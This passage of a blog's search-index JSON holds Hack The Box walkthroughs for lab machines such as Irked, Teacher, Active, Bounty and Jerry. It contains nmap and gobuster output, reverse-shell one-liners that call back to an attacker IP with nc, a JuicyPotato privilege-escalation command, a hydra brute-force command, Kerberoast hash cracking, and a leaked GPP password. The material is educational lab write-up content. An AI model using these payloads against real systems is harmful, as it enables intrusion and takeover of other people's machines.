1880/tcp open vsat-control 9999/tcp open abyss Nmap done: 1 IP address (1 host up) scanned in 1037.54 seconds └─$ nmap -sV -sC -p22,139,445,1880,9999 10.","tags":["HTB","smbmap","smbclient","nodered","gobuster","php","playsms","javascript","ook!","python","brainfuck","fcrackzip","xxd","cve-2017-9101","webshell","bof","ret2libc","pwndbg","searchsploit"],"title":"[HTB] Machine: Frolic"},{"categories":null,"contents":"Irked Enumeration nmap └─$ nmap -Pn -p- 10.10.10.117 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 18:23 BST Nmap scan report for 10.10.10.117 (10.10.10.117) Host is up (0.15s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 6697/tcp open ircs-u 8067/tcp open infi-async 58258/tcp open unknown 65534/tcp open unknown └─$ nmap -sV -sC -p22,80,111,6697,8067,58258,65534 10.10.10.117 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 18:51 BST Nmap scan report for 10.10.10.117 (10.10.10.117) Host is up (0.16s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a5df5bdcf8378b675319bdc79c5fdad (DSA) | 2048 752e66bfb93cccf77e848a8bf0810233 (RSA) | 256 c8a3a25e349ac49b9053f750bfea253b (ECDSA) |_ 256 8d1b43c7d01a4c05cf82edc10163a20c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 35649/udp6 status | 100024 1 44214/tcp6 status | 100024 1 58258/tcp status |_ 100024 1 59795/udp status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 58258/tcp open status 1 (RPC #100024) 65534/tcp open irc UnrealIRCd (Admin email djmardov@irked.htb) Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.24 seconds Web server Foothold We have an open irc port Let\u0026rsquo;s connect Create and edit new network: irked in screenshots below Setup connection: change newserver/6697 to 10.10.10.117/6697 We can add the network to favorites and filter everything out And finally connect Nothing interesting except the version of the software Let\u0026rsquo;s use searchsploit to search for vulnerabilities And we find a few Let\u0026rsquo;s test rce Seems like it works Let\u0026rsquo;s get our foothold payload: AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.3 6666 \u0026gt;/tmp/f User Now we need to privesc Enumerate as usual We see interesting file in /home/djmardov/Documents directory Let\u0026rsquo;s open it It certainly implies stenography and we have an image on the website Let\u0026rsquo;s check it I used steghide And we have our user Root Basic enumeration linpeas or manual sudo -l - no results search for suid binaries: find / -perm -4000 -exec ls -lha {} \\; 2\u0026gt;/dev/null Strange vievuser file We have an error that sh can\u0026rsquo;t locate /tmp/listusers Let\u0026rsquo;s create file and add whoami just in case it will execute it So, we can pretty much execute anyhing Start listener and add reverse shell payload to /tmp/listusers Rooted ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/irked/images/irked.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/irked/","summary":"Irked Enumeration nmap └─$ nmap -Pn -p- 10.10.10.117 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 18:23 BST Nmap scan report for 10.10.10.117 (10.10.10.117) Host is up (0.15s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 6697/tcp open ircs-u 8067/tcp open infi-async 58258/tcp open unknown 65534/tcp open unknown └─$ nmap -sV -sC -p22,80,111,6697,8067,58258,65534 10.10.10.117 Starting Nmap 7.93 ( https://nmap.","tags":["HTB","searchsploit","exploit-db","hexchat","irc","python","steganography","steghide","ssh","su","password-reuse","metasploit","exim"],"title":"[HTB] Machine: Irked"},{"categories":null,"contents":"Teacher Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.153 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 16:50 BST Nmap scan report for 10.10.10.153 (10.10.10.153) Host is up (0.10s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.53 seconds gobuster └─$ gobuster dir -u http://10.10.10.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.153 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,html [+] Timeout: 10s =============================================================== 2023/06/15 16:47:54 Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 292] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.153/images/] /index.html (Status: 200) [Size: 8028] /gallery.html (Status: 200) [Size: 8254] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.153/css/] /manual (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.153/manual/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.153/js/] /javascript (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.153/javascript/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.153/fonts/] /phpmyadmin (Status: 403) [Size: 297] /moodle (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.153/moodle/] /.html (Status: 403) [Size: 292] /server-status (Status: 403) [Size: 300] Web server Checked a few interesting paths provided by gobuster Foothold I spend so much time searching for clues Checked searchploit Found a few rce exploit, but they require authentification Checked /images And found a note We have piece of the password, let\u0026rsquo;s write a script to generate all possible variations Let\u0026rsquo;s run hydra hydra -l Giovanni -P passwords.list teacher.htb http-post-form \u0026quot;/moodle/login/index.php:anchor=\u0026amp;username=^USER^\u0026amp;password=^PASS^\u0026amp;rememberusername=1:Invalid login\u0026quot; Now we can check the exploits There is a post explaining rce in moodle Now we need to follow the steps and get our rce\nLaunch a listener And perform the steps defined in the post The following screenshots contain the steps described in the post Login, turn on editing and add an activity to any topic\nSelect Quiz Fill in required fields and save Open quiz and click on edit quiz button Add a new question Select calculated Fill in required forms Add payload to Answer field Save and click next Add payload to end of url \u0026amp;0=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;%261|nc 10.10.16.3 6666 \u0026gt;/tmp/f We got a foothold User Enumerate We can run linpeas I started with basic enumeration sudo -l with no success find / -perm -4000 -exec ls -lha {} \\; 2\u0026gt;/dev/null no success ps -ef showed that we have a mysql running Let\u0026rsquo;s check the /var/www/html/moodle folder Search for db configuration file We found config.php Open it and use the creds stored to connect to mysql mysql -u root -p Found creds stored in moodle db and mdl_user table Checked hash in Crackstation su to giovanni Root Enumerate again pspy and linpeas Let\u0026rsquo;s open the script We have few variants Change permissions using symbolic links ln -s since for each symbolic link listed on the command line, chmod changes the permissions of the pointed-to file So we can create links to /etc/passwd -\u0026gt; modify it by adding root user /etc/shadow -\u0026gt; modify it by adding root user or crack root hash /usr/bin/backup.sh -\u0026gt; append reverse shell payload I prefered the last option Setup listener and wait for connection Rooted ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/teacher/images/teacher.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/teacher/","summary":"Teacher Enumeration nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.153 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 16:50 BST Nmap scan report for 10.10.10.153 (10.10.10.153) Host is up (0.10s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Blackhat highschool Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.","tags":["HTB","debian","stretch","skipfish","hydra","python","cve-2018-1133","crackstation","mysql","pspy","su","cron","chmod","arbitrary-write","moodle"],"title":"[HTB] Machine: Teacher"},{"categories":null,"contents":"Active Enumeration nmap └─$ nmap -sC -sV 10.10.10.100 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 09:34 BST Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 5.75% done; ETC: 09:34 (0:00:16 remaining) Nmap scan report for 10.10.10.100 (10.10.10.100) Host is up (0.17s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-11 08:34:18Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-06-11T08:35:17 |_ start_date: 2023-06-11T08:16:24 | smb2-security-mode: | 210: |_ Message signing enabled and required |_clock-skew: -30s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 104.06 seconds SMB enumeration enum4linux 10.10.10.100 Check Replication share ┌──(kali㉿kali)-[~] └─$ smbmap -H 10.10.10.100 -R [+] IP: 10.10.10.100:445 Name: 10.10.10.100 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC NETLOGON NO ACCESS Logon server share Replication READ ONLY .\\Replication\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 active.htb .\\Replication\\active.htb\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 DfsrPrivate dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Policies dr--r--r-- 0 Sat Jul 21 11:37:44 2018 scripts .\\Replication\\active.htb\\DfsrPrivate\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 ConflictAndDeleted dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Deleted dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Installing .\\Replication\\active.htb\\Policies\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 {31B2F340-016D-11D2-945F-00C04FB984F9} dr--r--r-- 0 Sat Jul 21 11:37:44 2018 {6AC1786C-016F-11D2-945F-00C04fB984F9} .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. fr--r--r-- 23 Sat Jul 21 11:38:11 2018 GPT.INI dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Group Policy dr--r--r-- 0 Sat Jul 21 11:37:44 2018 MACHINE dr--r--r-- 0 Sat Jul 21 11:37:44 2018 USER .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. fr--r--r-- 119 Sat Jul 21 11:38:11 2018 GPE.INI .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Microsoft dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Preferences fr--r--r-- 2788 Sat Jul 21 11:38:11 2018 Registry.pol .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Windows NT .\\Replication\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Groups .\\Replication\\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. fr--r--r-- 22 Sat Jul 21 11:38:11 2018 GPT.INI dr--r--r-- 0 Sat Jul 21 11:37:44 2018 MACHINE dr--r--r-- 0 Sat Jul 21 11:37:44 2018 USER .\\Replication\\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Microsoft .\\Replication\\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\* dr--r--r-- 0 Sat Jul 21 11:37:44 2018 . dr--r--r-- 0 Sat Jul 21 11:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 11:37:44 2018 Windows NT SYSVOL NO ACCESS Logon server share Users NO ACCESS Let\u0026rsquo;s open Groups.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; ~ Foothold/User We got a password from smb enumeration Let\u0026rsquo;s decrypt using gpp-decrypt Root Since it\u0026rsquo;s a Domain Controller Let\u0026rsquo;s do basic enumeration for Active Directory Check SPN\u0026rsquo;s And we get Administrator\u0026rsquo;s hash Let\u0026rsquo;s crack it hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt Rooted ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/active/images/active.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/active/","summary":"Active Enumeration nmap └─$ nmap -sC -sV 10.10.10.100 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 09:34 BST Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 5.75% done; ETC: 09:34 (0:00:16 remaining) Nmap scan report for 10.10.10.100 (10.10.10.100) Host is up (0.17s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.","tags":["HTB","active-directory","gpp-password","gpp-decrypt","smb","smbmap","smbclient","enum4linux","getuserspns","kerberoast","hashcat","psexec"],"title":"[HTB] Machine: Active"},{"categories":null,"contents":"Bashed Enumeration nmap └─$ nmap -sC -sV 10.10.10.68 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 18:47 BST Nmap scan report for 10.10.10.68 (10.10.10.68) Host is up (0.14s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel\u0026#39;s Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.87 seconds gobuster └─$ gobuster dir -u http://10.10.10.68/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -x php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.68/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/08 19:48:11 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.68/images/] /uploads (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.68/uploads/] /config.php (Status: 200) [Size: 0] /dev (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/dev/] /php (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/php/] /js (Status: 301) [Size: 307] [--\u0026gt; http://10.10.10.68/js/] /css (Status: 301) [Size: 308] [--\u0026gt; http://10.10.10.68/css/] /fonts (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.68/fonts/] /server-status (Status: 403) [Size: 299] /.php (Status: 403) [Size: 290] Webserver Foothold/User Let\u0026rsquo;s check dev directory We see phpbash.php Let\u0026rsquo;s open it And we get a webshell Let\u0026rsquo;s try to upgrade the shell Setup a listener and send a reverse shell payload Root Enumerate for privesc sudo -l We can sudo as scriptmanager Let\u0026rsquo;s launch bash as scriptmanager Enumerate as scriptmanager We see interesting directory named /scripts owned by scriptmanager Let\u0026rsquo;s check it Open the script and analyse You will see that it creates a test.txt Notice that the test.txt is owned by root It looks like there is an automated process or cronjob that launches test.py as a root use pspy64 So we can change the content of the test.py and get reverse shell ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bashed/images/bashed.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bashed/","summary":"Bashed Enumeration nmap └─$ nmap -sC -sV 10.10.10.68 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 18:47 BST Nmap scan report for 10.10.10.68 (10.10.10.68) Host is up (0.14s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Arrexel\u0026#39;s Development Site Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 25.","tags":["HTB","php","sudo","cron"],"title":"[HTB] Machine: Bashed"},{"categories":null,"contents":"Bounty Enumeration nmap └─$ nmap -sC -sV 10.10.10.93 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 16:26 BST Nmap scan report for 10.10.10.93 (10.10.10.93) Host is up (0.098s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Bounty Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds gobuster └─$ gobuster dir -u http://10.10.10.93 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x asp,aspx =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.93 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: asp,apsx [+] Timeout: 10s =============================================================== 2023/06/10 16:39:26 Starting gobuster in directory enumeration mode =============================================================== /transfer.aspx (Status: 200) [Size: 941] /UploadedFiles (Status: 301) [Size: 156] [--\u0026gt; http://10.10.10.93/UploadedFiles/] /uploadedFiles (Status: 301) [Size: 156] [--\u0026gt; http://10.10.10.93/uploadedFiles/] /uploadedfiles (Status: 301) [Size: 156] [--\u0026gt; http://10.10.10.93/uploadedfiles/] Progress: 661634 / 661683 (99.99%) =============================================================== 2023/06/10 17:15:00 Finished =============================================================== Web server Foothold/User We see transfer.aspx and uploadedFiles endpoints available Let\u0026rsquo;s upload a file Success But I couldn\u0026rsquo;t upload a file with aspx extension there is a blog and this one from the same author Test out the poc And we see that we have rce I was trying different variations of poc but had no success Turns out, I broke the box so I needed to reboot it Then I used the same poc from the first blog as in the picture above But added few modifications, using /usr/share/webshells/asp/cmdasp.asp Let\u0026rsquo;s upload and run it And we get our foothold Root Enumerate privileges whoami /priv We see SeImpersonatePrivilege Let\u0026rsquo;s run JuicyPotato So download binary and nc.exe Set up new listener .\\jp.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \u0026quot;/c c:\\users\\merlin\\downloads\\nc.exe 10.10.16.3 7777 -e cmd.exe\u0026quot; -t * And root the box ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/bounty/images/bounty.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/bounty/","summary":"Bounty Enumeration nmap └─$ nmap -sC -sV 10.10.10.93 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 16:26 BST Nmap scan report for 10.10.10.93 (10.10.10.93) Host is up (0.098s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Bounty Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB","asp","upload","lonelypotato","potato","meterpreter","ms10-051","ms16-014","web-config","sherlock","watson"],"title":"[HTB] Machine: Bounty"},{"categories":null,"contents":"Jerry Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.95 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 12:02 BST Nmap scan report for 10.10.10.95 (10.10.10.95) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-open-proxy: Proxy might be redirecting requests |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds Web Server Foothold/User/Root Let\u0026rsquo;s try default creds for Tomcat's Manager Application tomcat:s3cret Success Now we can deploy our app Generate payload using msvenom with externsion war Upload it Let\u0026rsquo;s find the jsp page generated by msfvenom Open the path And we get our root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/jerry/images/jerry.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/jerry/","summary":"Jerry Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.95 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 12:02 BST Nmap scan report for 10.10.10.95 (10.10.10.95) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-open-proxy: Proxy might be redirecting requests |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB","tomcat","war","msfvenom","jar","jsp"],"title":"[HTB] Machine: Jerry"},{"categories":null,"contents":"Nibbles nmap └─$ nmap -sC -sV 10.10.10.75 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 17:13 BST Nmap scan report for 10.10.10.75 (10.10.10.75) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4f8ade8f80477decf150d630a187e49 (RSA) | 256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA) |_ 256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 35.68 seconds We see the comment in the page source gobuster └─$ gobuster dir -u http://10.10.10.75/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -x php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.75/nibbleblog [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/08 17:38:18 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 301) [Size: 321] [--\u0026gt; http://10.10.10.75/nibbleblog/admin/] /feed.php (Status: 200) [Size: 302] /install.php (Status: 200) [Size: 78] /content (Status: 301) [Size: 323] [--\u0026gt; http://10.10.10.75/nibbleblog/content/] /languages (Status: 301) [Size: 325] [--\u0026gt; http://10.10.10.75/nibbleblog/languages/] /sitemap.php (Status: 200) [Size: 402] /themes (Status: 301) [Size: 322] [--\u0026gt; http://10.10.10.75/nibbleblog/themes/] /admin.php (Status: 200) [Size: 1401] /index.php (Status: 200) [Size: 2987] /plugins (Status: 301) [Size: 323] [--\u0026gt; http://10.10.10.75/nibbleblog/plugins/] /update.php (Status: 200) [Size: 1622] /.php (Status: 403) [Size: 301] Let\u0026rsquo;s check admin.php We see the version of the Nibbleblog Foothold/User Let\u0026rsquo;s search for exploits We found the file upload exploit which can be launched only as an authenticated user Let\u0026rsquo;s enumerate other directories that were found by gobuster We found username No signs of password, so let\u0026rsquo;s try guessing, since there are no default passwords Luckily it was the name of the box Now we can launch file upload attack And get our shell Root Basic privesc enumeration sudo -l Let\u0026rsquo;s check the indicated path We can create a new file with the same name or append the code we want it to execute I created new file which deployed a reverse shell And we get our root ","date":"June 7, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/nibbles/images/nibbles.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/nibbles/","summary":"Nibbles nmap └─$ nmap -sC -sV 10.10.10.75 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-08 17:13 BST Nmap scan report for 10.10.10.75 (10.10.10.75) Host is up (0.18s latency). Not shown: 998 closed 